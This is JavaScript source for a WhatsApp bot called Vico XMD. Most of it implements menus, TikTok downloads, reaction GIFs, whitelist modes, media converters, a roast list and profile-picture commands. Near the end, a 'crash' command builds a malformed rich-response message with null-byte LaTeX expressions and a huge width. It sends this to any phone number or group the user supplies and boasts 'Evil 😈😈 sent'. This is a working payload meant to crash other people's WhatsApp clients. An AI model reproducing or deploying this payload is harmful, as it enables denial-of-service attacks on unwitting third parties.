┃𓂃 │▸ .ʙɪʙʟᴇǫᴜᴏᴛᴇ
┃𓂃 │▸ .ʙɪɴᴀʀʏ
┃𓂃 │▸ .ʙʟᴀᴄᴋᴊᴀᴄᴋ
┃𓂃 │▸ .ʙᴏᴍʙ
┃𓂃 │▸ .ʙᴏᴍʙɢᴀᴍᴇ
┃𓂃 │▸ .ᴄᴀʟᴄ
┃𓂃 │▸ .ᴄᴀʀɢᴀᴍᴇ
┃𓂃 │▸ .ᴄʜᴀʀs
┃𓂃 │▸ .ᴄᴏɪɴ
┃𓂃 │▸ .ᴄᴏɪɴғʟɪᴘ
┃𓂃 │▸ .ᴄᴏᴍᴘʟɪᴍᴇɴᴛ
┃𓂃 │▸ .ᴄᴏᴜɴᴛ
┃𓂃 │▸ .ᴄᴘᴜ
┃𓂃 │▸ .ᴄʀᴀsʜɢᴀᴍᴇ
┃𓂃 │▸ .ᴅᴀʀᴇ
┃𓂃 │▸ .ᴅᴀᴛᴇ
┃𓂃 │▸ .ᴅᴀʏ
┃𓂃 │▸ .ᴅɪᴄᴇ
┃𓂃 │▸ .ᴅɪᴄᴇɢᴀᴍᴇ
┃𓂃 │▸ .ᴅɪᴠɪᴅᴇ
┃𓂃 │▸ .ᴇᴄʜᴏ
┃𓂃 │▸ .ғᴀᴄᴛ
┃𓂃 │▸ .ғɪɢʜᴛɢᴀᴍᴇ
┃𓂃 │▸ .ғʟɪᴘᴛᴇxᴛ
┃𓂃 │▸ .ғʟɪʀᴛ
┃𓂃 │▸ .ɢᴀʟᴀxʏ
┃𓂃 │▸ .ɢᴀᴍᴇs
┃𓂃 │▸ .ɢᴀʏ
┃𓂃 │▸ .ɢɪsᴛ
┃𓂃 │▸ .ɢʀᴇᴇᴛ
┃𓂃 │▸ .ɢᴜᴇss
┃𓂃 │▸ .ʜᴀɴɢ
┃𓂃 │▸ .ʜɪɢʜᴇʀʟᴏᴡᴇʀ
┃𓂃 │▸ .ɪɴsᴜʟᴛ
┃𓂃 │▸ .ᴊᴏᴋᴇ
┃𓂃 │▸ .ʟᴇɴɢᴛʜ
┃𓂃 │▸ .ʟᴏᴡᴇʀᴄᴀsᴇ
┃𓂃 │▸ .ᴍᴀᴛʜғᴀᴄᴛ
┃𓂃 │▸ .ᴍᴀᴛʜɢᴀᴍᴇ
┃𓂃 │▸ .ᴍᴇᴍᴏʀʏ
┃𓂃 │▸ .ᴍᴇᴍᴏʀʏɢᴀᴍᴇ
┃𓂃 │▸ .ᴍɪɴᴇɢᴀᴍᴇ
┃𓂃 │▸ .ᴍᴜʟᴛɪᴘʟʏ
┃𓂃 │▸ .ɴᴇᴠᴇʀ
┃𓂃 │▸ .ɴᴇᴡsɴᴀɪᴊᴀ
┃𓂃 │▸ .ɴᴏᴅᴇ
┃𓂃 │▸ .ᴘ
┃𓂃 │▸ .ᴘᴀᴄᴍᴀɴ
┃𓂃 │▸ .ᴘᴀssᴡᴏʀᴅ
┃𓂃 │▸ .ᴘᴇʀᴄᴇɴᴛ
┃𓂃 │▸ .ᴘɪɴɢ
┃𓂃 │▸ .ᴘʟᴀɴᴇᴛ
┃𓂃 │▸ .ᴘʟᴀᴛғᴏʀᴍ
┃𓂃 │▸ .ᴘʟɪɴᴋᴏɢᴀᴍᴇ
┃𓂃 │▸ .ᴘᴏᴡᴇʀ
┃𓂃 │▸ .ᴘʀᴀɴᴋ
┃𓂃 │▸ .ᴘʀᴏᴠᴇʀʙ
┃𓂃 │▸ .ǫʀ
┃𓂃 │▸ .ǫᴜɪᴢ
┃𓂃 │▸ .ǫᴜᴏᴛᴇ
┃𓂃 │▸ .ǫᴜʀᴀɴǫᴜᴏᴛᴇ
┃𓂃 │▸ .ʀᴀᴛᴇ
┃𓂃 │▸ .ʀᴇᴄɪᴘᴇ
┃𓂃 │▸ .ʀᴇʟᴀᴛɪᴏɴsʜɪᴘ
┃𓂃 │▸ .ʀᴇᴘᴇᴀᴛ
┃𓂃 │▸ .ʀɪᴅᴅʟᴇ
┃𓂃 │▸ .ʀᴏᴀsᴛ
┃𓂃 │▸ .ʀᴏᴜʟᴇᴛᴛᴇ
┃𓂃 │▸ .ʀᴘs
┃𓂃 │▸ .sᴄɪᴇɴᴄᴇғᴀᴄᴛ
┃𓂃 │▸ .sᴄʀᴀᴍʙʟᴇ
┃𓂃 │▸ .sᴇɴsɪ
┃𓂃 │▸ .sᴇʀᴠᴇʀ
┃𓂃 │▸ .sʜɪᴘ
┃𓂃 │▸ .sʜᴏʀᴛ
┃𓂃 │▸ .sʜᴏʀᴛᴜʀʟ
┃𓂃 │▸ .sʟɪᴅᴇ
┃𓂃 │▸ .sʟᴏᴛs
┃𓂃 │▸ .sɴᴀᴋᴇ
┃𓂃 │▸ .sɴᴀᴋᴇɢᴀᴍᴇ
┃𓂃 │▸ .sᴘᴀᴄᴇ
┃𓂃 │▸ .sᴘᴇᴇᴅɢᴀᴍᴇ
┃𓂃 │▸ .sᴛᴜᴘɪᴅ
┃𓂃 │▸ .sᴜᴍ
┃𓂃 │▸ .ᴛᴇᴛʀɪs
┃𓂃 │▸ .ᴛɪᴄᴛᴀᴄᴛᴏᴇ
┃𓂃 │▸ .ᴛɪᴍᴇ
┃𓂃 │▸ .ᴛɪᴍᴇsᴛᴀᴍᴘ
┃𓂃 │▸ .ᴛɪᴍᴇᴢᴏɴᴇ
┃𓂃 │▸ .ᴛɪɴʏᴛᴇxᴛ
┃𓂃 │▸ .ᴛʀɪᴠɪᴀ
┃𓂃 │▸ .ᴛʀᴜᴛʜ
┃𓂃 │▸ .ᴛʏᴘᴇɢᴀᴍᴇ
┃𓂃 │▸ .ᴜᴘᴘᴇʀᴄᴀsᴇ
┃𓂃 │▸ .ᴜᴜɪᴅ
┃𓂃 │▸ .ᴡᴇᴀᴛʜᴇʀ
┃𓂃 │▸ .ᴡʜᴀᴄᴋɢᴀᴍᴇ
┃𓂃 │▸ .ᴡʜᴇᴇʟ
┃𓂃 │▸ .ᴡᴏʀᴅ
┃𓂃 │▸ .ᴡᴏʀᴅʟᴇ
┃𓂃 │▸ .ᴡᴏʀᴅs
┃𓂃 │▸ .ᴡʏʀ
┃𓂃 │▸ .ʏᴀʀɴ
╰━━━━━━━━━━┈⸎

╭━━〔 ᴛᴇxᴛ ᴅᴇsɪɢɴ 16 〕━━┈⸎
┃𓂃 │▸ .ɢғx1
┃𓂃 │▸ .ɢғx2
┃𓂃 │▸ .ɢғx3
┃𓂃 │▸ .ɢғx4
┃𓂃 │▸ .ɢғx5
┃𓂃 │▸ .ɢғx6
┃𓂃 │▸ .ɢғx7
┃𓂃 │▸ .ɢғx8
┃𓂃 │▸ .ɢғx9
┃𓂃 │▸ .ɢғx10
┃𓂃 │▸ .ɢғx11
┃𓂃 │▸ .ɢғx12
┃𓂃 │▸ .ɢғx13
┃𓂃 │▸ .ɢғx14
┃𓂃 │▸ .ɢғx15
┃𓂃 │▸ .ᴛᴇxᴛ2ɪᴍɢ
╰━━━━━━━━━━┈⸎

╭━━〔 ɢɪғ ʀᴇᴀᴄᴛɪᴏɴs 31 〕━━┈⸎
┃𓂃 │▸ .ʙɪᴛᴇ
┃𓂃 │▸ .ʙʟᴇʜ
┃𓂃 │▸ .ʙʟᴜsʜ
┃𓂃 │▸ .ᴄᴀʀʀʏ
┃𓂃 │▸ .ᴄʟᴀᴘ
┃𓂃 │▸ .ᴄᴏɴғᴜsᴇᴅ
┃𓂃 │▸ .ᴄʀʏ
┃𓂃 │▸ .ᴄᴜᴅᴅʟᴇ
┃𓂃 │▸ .ᴅᴀɴᴄᴇ
┃𓂃 │▸ .ғᴀᴄᴇᴘᴀʟᴍ
┃𓂃 │▸ .ʜᴀᴘᴘʏ
┃𓂃 │▸ .ʜᴜɢ
┃𓂃 │▸ .ᴋᴀʙᴇᴅᴏɴ
┃𓂃 │▸ .ᴋɪss
┃𓂃 │▸ .ᴘᴀᴛ
┃𓂃 │▸ .ᴘᴇᴄᴋ
┃𓂃 │▸ .ᴘᴏᴋᴇ
┃𓂃 │▸ .ᴘᴏᴜᴛ
┃𓂃 │▸ .ᴘᴜɴᴄʜ
┃𓂃 │▸ .ʀᴜɴ
┃𓂃 │▸ .sʜʀᴜɢ
┃𓂃 │▸ .sʟᴀᴘ
┃𓂃 │▸ .sʟᴇᴇᴘ
┃𓂃 │▸ .sᴍɪʟᴇ
┃𓂃 │▸ .sᴍᴜɢ
┃𓂃 │▸ .sᴘɪɴ
┃𓂃 │▸ .sᴛᴀʀᴇ
┃𓂃 │▸ .ᴛɪᴄᴋʟᴇ
┃𓂃 │▸ .ᴡɪɴᴋ
┃𓂃 │▸ .ʏᴀᴡɴ
┃𓂃 │▸ .ʏᴇᴇᴛ
╰━━━━━━━━━━┈⸎

> ᴠɪᴄᴏ xᴍᴅ ɪs ɢᴏᴀᴛᴇᴅ 💫`;

    try {
        // Prefer local logo, then loaded buffer, then working catbox URL
        let imagePayload = null;
        const absPath = path.join(__dirname, '../media/logo.jpg');
        const relPath = './media/logo.jpg';

        if (typeof menuImageBuffer !== 'undefined' && menuImageBuffer && menuImageBuffer.length > 100) {
            imagePayload = { image: menuImageBuffer };
        } else if (fs.existsSync(absPath)) {
            imagePayload = { image: fs.readFileSync(absPath) };
        } else if (fs.existsSync(relPath)) {
            imagePayload = { image: fs.readFileSync(relPath) };
        } else {
            // Working fallback link
            imagePayload = { image: { url: 'https://files.catbox.moe/s7kl0m.jpg' } };
        }

        await empire.sendMessage(m.chat, {
            ...imagePayload,
            caption: menuText,
            contextInfo: newsletterContext({ mentionedJid: [m.sender] })
        }, { quoted: m });
    } catch (e) {
        console.error('❌ Menu send error:', e.message);
        try {
            await empire.sendMessage(m.chat, {
                image: { url: 'https://files.catbox.moe/s7kl0m.jpg' },
                caption: menuText,
                contextInfo: newsletterContext({ mentionedJid: [m.sender] })
            }, { quoted: m });
        } catch (e2) {
            await empire.sendMessage(m.chat, { text: menuText, contextInfo: newsletterContext() }, { quoted: m });
        }
    }
    break;
}
// ═══════════════════════════════════════════════════
// TIKTOK DOWNLOAD COMMAND
// ═══════════════════════════════════════════════════
// ═══════════════════════════════════════════════════
// TIKTOK DOWNLOAD COMMAND (Using wa-sticker-formatter)
// ═══════════════════════════════════════════════════
case 'tiktok':
case 'tt':
case 'ttdl': {
    const url = (text || args[0] || '').trim();
    if (!url || !/^https?:\/\//i.test(url)) {
        return reply('🎵 *TikTok*\n\nUsage: ' + prefix + 'tiktok <url>');
    }
    await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {});
    try {
        const resolved = await vicoResolveMedia(url);
        await vicoSendResolved(empire, m, resolved);
        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } }).catch(() => {});
    } catch (e) {
        reply('❌ TikTok failed: ' + (e.message || 'error'));
    }
    break;
}

// ═══════════════════════════════════════════════════
// GIF REACTION COMMANDS
// ═══════════════════════════════════════════════════
// ═══════════════════════════════════════════════════
// GIF REACTION COMMANDS (FIXED)
// ═══════════════════════════════════════════════════

// ═══════════════════════════════════════════════════
// NEKOSBEST — 50 SFW REACTION COMMANDS
// ═══════════════════════════════════════════════════
case 'lurk': case 'shdbdhoot': case 'sleep': case 'clap': case 'shrug':
case 'stare': case 'wabnve': case 'poke': case 'confused': case 'smile':
case 'peck': case 'wink': case 'sip': case 'blush': case 'smug':
case 'tickle': case 'yeet': case 'thijbsbbnk': case 'higdbbdhfive': case 'feed':
case 'washshg': case 'bite': case 'teehee': case 'shocked': case 'bleh':
case 'bored': case 'nom': case 'nya': case 'yawn': case 'facepalm':
case 'cuddle': case 'happy': case 'carry': case 'hug': case 'kabedon':
case 'bakbdba': case 'bodbbsnk': case 'pat': case 'anhhhgry': case 'spin':
case 'shbbsbake': case 'run': case 'nod': case 'nope': case 'kiss': case 'dance':
case 'punch': case 'hanhehhdshake': case 'slap': case 'cry': case 'pout': {
    await sendNekosBestReaction(empire, m, command, prefix, args);
    break;
}

// ═══════════════════════════════════════════════════
// BOT MODE - Public / Private
// ═══════════════════════════════════════════════════
case 'mode':
case 'botmode':
case 'setmode': {
    if (!isCreator) return reply('❌ *Only the bot owner can change bot mode.*');
    
    const opt = args[0]?.toLowerCase();
    
    // ─── SHOW CURRENT MODE ───
    if (!opt) {
        const mode = db.botMode?.mode || 'public';
        const whitelist = db.botMode?.whitelist || [];
        const whitelistDisplay = whitelist.length > 0 
            ? whitelist.map(j => `  ✦ @${j.split('@')[0]}`).join('\n') 
            : '  ✦ None';
        
        return reply(
`🔒━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔒
        ✦  BOT MODE  ✦
🔒━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔒

📊 *Current Mode:* ${mode.toUpperCase()}

📌 *Commands:*
✦ ${prefix}mode public     ⋮ Allow everyone
✦ ${prefix}mode private    ⋮ Owner & whitelist only

🔒━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔒`
        );
    }
    
    // ─── SET TO PUBLIC MODE ───
    if (opt === 'public') {
        db.botMode.mode = 'public';
        saveDB();
        reply(
`🌍 *MODE: PUBLIC*
━━━━━━━━━━━━━━━━━━━━━━━

✅ Everyone can use all commands.

📌 *Private mode:*
${prefix}mode private

🌍━━━━━━━━━━━━━━━━━━━━━━━`
        );
        break;
    }
    
    // ─── SET TO PRIVATE MODE ───
    if (opt === 'private') {
        db.botMode.mode = 'private';
        saveDB();
        reply(
`🔒 *MODE: PRIVATE*
━━━━━━━━━━━━━━━━━━━━━━━

✅ Only the bot owner and whitelisted users can use commands.

📌 *Switch to public:*
${prefix}mode public

🔒━━━━━━━━━━━━━━━━━━━━━━━`
        );
        break;
    }
    
    // ─── SHOW WHITELIST ───
    if (opt === 'whitelist' || opt === 'wl' || opt === 'list') {
        const whitelist = db.botMode?.whitelist || [];
        if (whitelist.length === 0) {
            return reply(
`👤 *WHITELIST*
━━━━━━━━━━━━━━━━━━━━━━━

📌 *Whitelist is empty.*

Add users with:
${prefix}mode add @user

👤━━━━━━━━━━━━━━━━━━━━━━━`
            );
        }
        const list = whitelist.map((j, i) => `${i+1}. ✦ @${j.split('@')[0]}`).join('\n');
        return reply(
`👤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━👤
        ✦  WHITELIST  ✦
👤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━👤

${list}

👤━━━━━━━━━━━━━━━━━━━━━━━━━━━━━👤
📊 *Total:* ${whitelist.length} users`
        );
    }
    
    // ─── ADD USER TO WHITELIST ───
    if (opt === 'add' || opt === 'adduser') {
        let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null) || args[1];
        
        if (!target) {
            return reply(
`❌ *Usage:*
${prefix}mode add @user

📌 *Or reply to a user's message:*
${prefix}mode add`
            );
        }
        
        // Clean JID
        target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        // Check if already whitelisted
        if (!db.botMode.whitelist) db.botMode.whitelist = [];
        if (db.botMode.whitelist.includes(target)) {
            return reply(`⚠️ @${target.split('@')[0]} is already whitelisted.`, { mentions: [target] });
        }
        
        db.botMode.whitelist.push(target);
        saveDB();
        reply(`✅ @${target.split('@')[0]} has been added to the whitelist.`, { mentions: [target] });
        break;
    }
    
    // ─── REMOVE USER FROM WHITELIST ───
    if (opt === 'remove' || opt === 'rem' || opt === 'del' || opt === 'delete') {
        let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null) || args[1];
        
        if (!target) {
            return reply(
`❌ *Usage:*
${prefix}mode remove @user

📌 *Or reply to a user's message:*
${prefix}mode remove`
            );
        }
        
        target = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        if (!db.botMode.whitelist) db.botMode.whitelist = [];
        const index = db.botMode.whitelist.indexOf(target);
        if (index === -1) {
            return reply(`⚠️ @${target.split('@')[0]} is not in the whitelist.`, { mentions: [target] });
        }
        
        db.botMode.whitelist.splice(index, 1);
        saveDB();
        reply(`✅ @${target.split('@')[0]} has been removed from the whitelist.`, { mentions: [target] });
        break;
    }
    
    // ─── CLEAR ALL WHITELIST ───
    if (opt === 'clear' || opt === 'clearall' || opt === 'reset') {
        db.botMode.whitelist = [];
        saveDB();
        reply(`✅ *Whitelist cleared!*\n\nAll users have been removed from the whitelist.`);
        break;
    }
    
    // ─── INVALID OPTION ───
    reply(
`❌ *Invalid option.*

📌 *Available commands:*
✦ ${prefix}mode public
✦ ${prefix}mode private
✦ ${prefix}mode whitelist
✦ ${prefix}mode add @user
✦ ${prefix}mode remove @user
✦ ${prefix}mode clear`
    );
    break;
}
// ═══════════════════════════════════════════════════
// TOIMAGE - Convert sticker to image
// ═══════════════════════════════════════════════════
case 'toimage':
case 'toimg': {
    try {
        const quoted = m.quoted ? m.quoted : m;
        const mime = quoted.mimetype || '';
        
        if (!/webp/.test(mime) && !/sticker/.test(mime)) {
            return reply(`🖼️ *Usage:* Reply to a sticker with:\n${prefix}toimage\n\nConverts sticker to image (JPG/PNG).`);
        }
        
        await reply('⏳ *Converting sticker to image...*');
        
        const mediaBuffer = await empire.downloadMediaMessage(quoted);
        if (!mediaBuffer || mediaBuffer.length === 0) {
            return reply('❌ Failed to download sticker.');
        }
        
        // Convert webp to image using sharp or ffmpeg
        let imageBuffer = null;
        try {
            const sharp = require('sharp');
            imageBuffer = await sharp(mediaBuffer).toFormat('jpeg').toBuffer();
        } catch (e) {
            // Fallback: try using ffmpeg
            try {
                const { exec } = require('child_process');
                const tmpDir = (require('path').join(require('os').tmpdir(), 'vico-tmp'));
                if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
                
                const inputPath = path.join(tmpDir, `sticker_${Date.now()}.webp`);
                const outputPath = path.join(tmpDir, `image_${Date.now()}.jpg`);
                
                fs.writeFileSync(inputPath, mediaBuffer);
                await new Promise((resolve, reject) => {
                    exec(`ffmpeg -i "${inputPath}" "${outputPath}"`, (error) => {
                        if (error) reject(error);
                        else resolve();
                    });
                });
                
                imageBuffer = fs.readFileSync(outputPath);
                try { fs.unlinkSync(inputPath); } catch {}
                try { fs.unlinkSync(outputPath); } catch {}
            } catch (e2) {
                console.error('Image conversion error:', e2);
                return reply('❌ Failed to convert sticker to image.');
            }
        }
        
        if (!imageBuffer || imageBuffer.length === 0) {
            return reply('❌ Failed to convert sticker to image.');
        }
        
        await empire.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `🖼️ *Sticker converted to image*\n\n📁 *Format:* JPEG\n📏 *Size:* ${(imageBuffer.length / 1024).toFixed(1)} KB`,
            contextInfo: newsletterContext()
        }, { quoted: m });
        
    } catch (e) {
        console.error('To image error:', e);
        reply(`❌ *Failed to convert:* ${e.message || 'Unknown error'}`);
    }
    break;
}

// ═══════════════════════════════════════════════════
// GETPP - Get profile picture
// ═══════════════════════════════════════════════════
case 'getpp':
case 'getprofilepic':
case 'pp': {
    try {
        let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null) || m.sender;
        
        // If text is provided, try to get user by number
        if (text && !target) {
            const number = text.replace(/[^0-9]/g, '');
            if (number.length >= 8) {
                target = `${number}@s.whatsapp.net`;
            }
        }
        
        const ppUrl = await empire.profilePictureUrl(target, 'image').catch(() => null);
        if (!ppUrl) {
            const name = target ? `@${target.split('@')[0]}` : 'this user';
            return reply(`❌ No profile picture found for ${name}.`, { mentions: [target] });
        }
        
        await empire.sendMessage(m.chat, {
            image: { url: ppUrl },
            caption: `🖼️ *Profile Picture*\n\n👤 *User:* @${target.split('@')[0]}`,
            mentions: [target],
            contextInfo: newsletterContext()
        }, { quoted: m });
        
    } catch (e) {
        console.error('Get PP error:', e);
        reply(`❌ *Failed to fetch profile picture:* ${e.message || 'Unknown error'}`);
    }
    break;
}

case 'insultme':
case 'roast': {
    try {
        const roasts = [
            "Your Wi-Fi has more stability than your decisions. 😭",
            "You bring “loading…” to every conversation. 💀",
            "Even autocorrect gives up on you. 😂",
            "You have the charisma of a dead battery. 🔋",
            "You're like a software update, nobody asked for you but you keep popping up. 😭",
            "If common sense was data, you'd be on airplane mode. ✈️",
            "Your comeback is still buffering. 💀",
            "You have 99 problems and your personality is all of them. 😂",
            "You're the reason the group chat is on mute. 🔇",
            "You bring zero to the table but still want front seat. 💀",
            "Even Google can't find your relevance. 😭",
            "You're not dumb, you just have bad luck thinking. 🤦",
            "Your confidence is high but your IQ is on low battery.",
            "You are like Monday morning, nobody likes you. 😂",
            "If you were a spice, you'd be flour. 😐",
            "Your life needs a restart button, not an update. 🔄",
            "You type so much nonsense, dictionary is tired of you. 📚",
            "You're proof that not everyone evolves. 💀",
            "Your opinion is like free WiFi in Aba, useless and slow. 😭",
            "You look like you argue with your shadow and lose. 😂",
            "Your brain went on vacation and never returned. 🏖️",
            "You're the human version of 'This message was deleted'. 💀",
            "If laziness was a job, you'd be CEO. 👑",
            "You have the energy of a nokia torch with low battery. 🔦",
            "You're so boring, even your shadow leaves you. 😭",
            "You are like free trial, annoying and expires fast. 💀",
            "Your gist is like NEPA light, it goes off when it's interesting. 😂",
            "You're the type to fail captcha, even robot knows you ain't human. 🤖"
        ];

        const roast = roasts[Math.floor(Math.random() * roasts.length)];

        await reply(`🔥 *ROAST*\n\n${roast}`);

    } catch (err) {
        console.error('Roast error:', err);
        reply(`❌ *Failed to roast:* ${err.message || 'Unknown error'}`);
    }
    break;
}

case 'setpp':
case 'setprofilepic': {
    if (!isCreator) return reply("❌ *Owner only!*");
    
    const quoted = m.quoted ? m.quoted : m;
    const mime = quoted.mimetype || quoted.msg?.mimetype || '';
    
    if (!/image/.test(mime)) {
        return reply(`🖼️ *Usage:* Reply to an image with:\n${prefix}setpp\n\nSet your profile picture`);
    }
    
    try {
        await reply('⏳ *Updating bot profile picture...*');
        
        // FIX: Use correct download method
        const mediaBuffer = await empire.downloadMediaMessage(quoted, 'buffer', {}, { 
            logger: console, 
            reuploadRequest: empire.updateMediaMessage 
        }).catch(async () => {
            // Fallback for baileys
            const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
            const type = Object.keys(quoted.message || quoted.msg || {})[0];
            const stream = await downloadContentFromMessage(quoted.message?.[type] || quoted.msg, 'image');
            let buffer = Buffer.from([]);
            for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
            return buffer;
        });

        if (!mediaBuffer || mediaBuffer.length === 0) {
            return reply('❌ Failed to download image.');
        }
        
        // FIX: Correct Baileys syntax - needs bot JID
        const botJid = empire.user.id;
        await empire.updateProfilePicture(botJid, mediaBuffer);
        reply(`✅ *Profile picture updated successfully!*`);

    } catch (e) {
        console.error('Set PP error:', e);
        reply(`❌ *Failed:* ${e.message || 'Unknown error'}\nMake sure na image you reply.`);
    }
    break;
}

// ═══════════════════════════════════════════════════
// TOAUDIO - Convert video to audio
// ═══════════════════════════════════════════════════
case 'toaudio':
case 'tomp3':
case 'extractaudio': {
    try {
        const quoted = m.quoted ? m.quoted : m;
        const mime = quoted.mimetype || '';
        
        if (!/video/.test(mime) && !/audio/.test(mime)) {
            return reply(`🎵 *Usage:* Reply to a video or audio with:\n${prefix}toaudio\n\nExtracts/Converts to MP3 audio.`);
        }
        
        await reply('⏳ *Converting to audio...*');
        
        const mediaBuffer = await empire.downloadMediaMessage(quoted);
        if (!mediaBuffer || mediaBuffer.length === 0) {
            return reply('❌ Failed to download media.');
        }
        
        // Use top-level import: const { toAudio, toPTT } = require('../lib/converter.js');
        
        // Determine format
        let format = 'mp4';
        if (mime.includes('mpeg') || mime.includes('mp4')) format = 'mp4';
        else if (mime.includes('ogg')) format = 'ogg';
        else if (mime.includes('webm')) format = 'webm';
        else if (mime.includes('mov')) format = 'mov';
        
        const audioBuffer = await toAudio(mediaBuffer, format);
        
        if (!audioBuffer || audioBuffer.length === 0) {
            return reply('❌ Failed to convert to audio.');
        }
        
        const title = m.quoted?.message?.videoMessage?.caption || 
                     m.quoted?.message?.audioMessage?.caption || 
                     'audio';
        
        await empire.sendMessage(m.chat, {
            audio: audioBuffer,
            mimetype: 'audio/mpeg',
            ptt: false,
            fileName: `${title}.mp3`,
            contextInfo: newsletterContext()
        }, { quoted: m });
        
    } catch (e) {
        console.error('To audio error:', e);
        reply(`❌ *Failed to convert:* ${e.message || 'Unknown error'}`);
    }
    break;
}

// ═══════════════════════════════════════════════════
// TOGIF - Convert video/sticker to GIF
// ═══════════════════════════════════════════════════
case 'togif':
case 'tomp4':
case 'togif': {
    try {
        const quoted = m.quoted ? m.quoted : m;
        const mime = quoted.mimetype || '';
        
        if (!/video/.test(mime) && !/webp/.test(mime) && !/gif/.test(mime)) {
            return reply(`🎬 *Usage:* Reply to a video or animated sticker with:\n${prefix}togif\n\nConverts to GIF/MP4.`);
        }
        
        await reply('⏳ *Converting to GIF...*');
        
        let mediaBuffer = await empire.downloadMediaMessage(quoted);
        if (!mediaBuffer || mediaBuffer.length === 0) {
            return reply('❌ Failed to download media.');
        }
        
        // If it's a sticker, convert to video first
        if (mime.includes('webp')) {
            try {
                const { exec } = require('child_process');
                const tmpDir = (require('path').join(require('os').tmpdir(), 'vico-tmp'));
                if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
                
                const inputPath = path.join(tmpDir, `sticker_${Date.now()}.webp`);
                const outputPath = path.join(tmpDir, `video_${Date.now()}.mp4`);
                
                fs.writeFileSync(inputPath, mediaBuffer);
                await new Promise((resolve, reject) => {
                    exec(`ffmpeg -i "${inputPath}" -vf "fps=15,scale=512:512:force_original_aspect_ratio=decrease" -c:v libx264 -pix_fmt yuv420p "${outputPath}"`, (error) => {
                        if (error) reject(error);
                        else resolve();
                    });
                });
                
                mediaBuffer = fs.readFileSync(outputPath);
                try { fs.unlinkSync(inputPath); } catch {}
                try { fs.unlinkSync(outputPath); } catch {}
            } catch (e) {
                console.error('Sticker to video error:', e);
                return reply('❌ Failed to convert sticker to video.');
            }
        }
        
        // Send as GIF with gifPlayback
        await empire.sendMessage(m.chat, {
            video: mediaBuffer,
            gifPlayback: true,
            caption: `🎬 *GIF Created*\n\n📏 *Size:* ${(mediaBuffer.length / 1024).toFixed(1)} KB`,
            contextInfo: newsletterContext()
        }, { quoted: m });
        
    } catch (e) {
        console.error('To GIF error:', e);
        reply(`❌ *Failed to convert:* ${e.message || 'Unknown error'}`);
    }
    break;
}

// ═══════════════════════════════════════════════════
// TOPTT - Convert audio/video to voice note (PTT)
// ═══════════════════════════════════════════════════
case 'toptt':
case 'tovoice':
case 'voice': {
    try {
        const quoted = m.quoted ? m.quoted : m;
        const mime = quoted.mimetype || '';
        
        if (!/video/.test(mime) && !/audio/.test(mime)) {
            return reply(`🎤 *Usage:* Reply to a video or audio with:\n${prefix}toptt\n\nConverts to voice note (PTT).`);
        }
        
        await reply('⏳ *Converting to voice note...*');
        
        const mediaBuffer = await empire.downloadMediaMessage(quoted);
        if (!mediaBuffer || mediaBuffer.length === 0) {
            return reply('❌ Failed to download media.');
        }
        
        // Use top-level import: const { toAudio, toPTT } = require('../lib/converter.js');
        
        // Determine format
        let format = 'mp4';
        if (mime.includes('mpeg') || mime.includes('mp4')) format = 'mp4';
        else if (mime.includes('ogg')) format = 'ogg';
        else if (mime.includes('webm')) format = 'webm';
        else if (mime.includes('mov')) format = 'mov';
        
        const pttBuffer = await toPTT(mediaBuffer, format);
        
        if (!pttBuffer || pttBuffer.length === 0) {
            return reply('❌ Failed to convert to voice note.');
        }
        
        await empire.sendMessage(m.chat, {
            audio: pttBuffer,
            mimetype: 'audio/ogg; codecs=opus',
            ptt: true,
            fileName: 'voice_note.ogg',
            contextInfo: newsletterContext()
        }, { quoted: m });
        
    } catch (e) {
        console.error('To PTT error:', e);
        reply(`❌ *Failed to convert:* ${e.message || 'Unknown error'}`);
    }
    break;
}
// ═══════════════════════════════════════════════════
// SETGCNAME - Set group name
// ═══════════════════════════════════════════════════
case 'setgcname':
case 'setsubject':
case 'setname': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    if (!text) return reply(`Usage: ${prefix}setgcname <new group name>`);
    try {
        await empire.groupUpdateSubject(m.chat, text);
        reply(`✅ *Group name updated to:*\n\n${text}`);
    } catch (e) {
        reply(`❌ Failed to update name: ${e.message}`);
    }
    break;
}

case 'crash': {
    if (!text) return reply(`💥 Usage: ${prefix}crash <jid>\nExample: ${prefix}crash 23499568667`);

    try {
        await empire.sendMessage(m.chat, { react: { text: '🧪', key: m.key } })

        let targetJid
        const num = text?.replace(/[^0-9]/g, "")

        if (text?.includes('g.us') || text?.includes('@g.us')) {
            targetJid = text.includes('@g.us') ? text : text + '@g.us'
        } else {
            targetJid = num + '@s.whatsapp.net'
        }

        const message = {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: [
                            {
                                messageType: 8,
                                latexMetadata: {
                                    text: "\0",
                                    expressions: [
                                        {
                                            latexExpression: "\0",
                                            width: 99999999
                                        }
                                    ]
                                }
                            }
                        ],
                        contextInfo: {
                            isForwarded: true,
                            forwardOrigin: 4
                        }
                    }
                }
            }
        }

        await empire.relayMessage(targetJid, message, {
            messageId: "CRASH-" + Date.now()
        })

        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        await reply(`Evil 😈😈 sent to ${targetJid}`)

    } catch (error) {
        console.error('[CRASH ERROR]', error)
        await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
        await reply(`❌ Failed: ${error.message}`)
    }
    break;
}

case 'block': {
    let target = null;
    if (m.quoted?.sender) {
        target = m.quoted.sender;
    } else if (m.mentionedJid && m.mentionedJid[0]) {
        target = m.mentionedJid[0];
    } else if (args[0]) {
        let num = args[0].replace(/[^0-9]/g, '');
        if (num.startsWith('0')) num = num.replace(/^0+/, '');
